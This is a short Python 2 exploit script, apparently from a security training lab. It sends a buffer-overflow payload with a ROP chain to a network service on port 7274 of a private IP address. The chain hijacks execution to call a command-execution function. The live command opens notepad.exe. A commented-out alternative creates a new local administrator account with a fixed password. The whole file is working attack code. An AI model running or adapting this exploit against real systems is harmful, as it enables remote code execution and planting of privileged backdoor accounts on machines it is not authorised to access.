#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host="192.168.255.194"
port = 7274

offset = "A" * 139
eip = pack('<L', 0x7274203c) # lea ecx, [esp + 0x50]; ret;

rop  = ""
rop += pack('<L', 0x727420be) # pop edi; ret;
rop += pack('<L', 0x72741a4f) # Endereço função _ExecCmd
rop += pack('<L', 0x72741f94) # push ecx; call edi;

cmd  = " " * 72
cmd += "notepad.exe"
#cmd += "cmd.exe /c \"net user securitycast @Pass123 /add && net localgroup administrators securitycast /add\""

payload = offset + eip + rop + cmd

buffer  = "SECURITYCAST "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))

print "[*] Pwned by M4v3r1ck..."
exp.recv(4096)
exp.send(buffer)
exp.close()

